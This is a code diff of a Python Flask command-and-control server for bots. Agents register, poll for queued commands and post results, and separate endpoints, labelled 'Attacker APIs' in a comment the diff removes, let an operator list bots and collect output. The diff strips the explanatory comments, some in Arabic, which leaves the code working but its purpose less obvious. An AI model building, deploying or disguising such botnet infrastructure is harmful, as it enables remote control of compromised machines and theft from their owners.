@@ -4,10 +4,9 @@ import json
 
 app = Flask(__name__)
 
-# قاعدة بيانات بسيطة
-bots = {}          # bot_id -> {"ip": ip, "last_seen": time, "cwd": path}
-commands = {}      # bot_id -> [list of commands]
-results = {}       # bot_id -> [list of results]
+bots = {}
+commands = {}
+results = {}
 
 @app.route('/')
 def index():
@@ -33,7 +32,6 @@ def index():
     </html>
     """
 
-# ===== الـ Agent APIs =====
 @app.route('/register', methods=['POST'])
 def register():
     data = request.json
@@ -56,10 +54,8 @@ def get_command(bot_id):
     if bot_id not in bots:
         return jsonify({"command": ""})
     
-    # نجدد آخر ظهور
     bots[bot_id]["last_seen"] = time.time()
     
-    # نبحث عن أمر
     if bot_id in commands and commands[bot_id]:
         cmd = commands[bot_id].pop(0)
         return jsonify({"command": cmd})
@@ -83,7 +79,6 @@ def send_result():
     
     return jsonify({"status": "ok"})
 
-# ===== Attacker APIs =====
 @app.route('/api/list_bots', methods=['GET'])
 def list_bots():
     now = time.time()
@@ -118,7 +113,6 @@ def get_result(bot_id):
     if bot_id not in results:
         return jsonify({"results": []})
     
-    # نجيب النتائج ونمسحهم
     res = results[bot_id].copy()
     results[bot_id] = []
     return jsonify({"results": res})
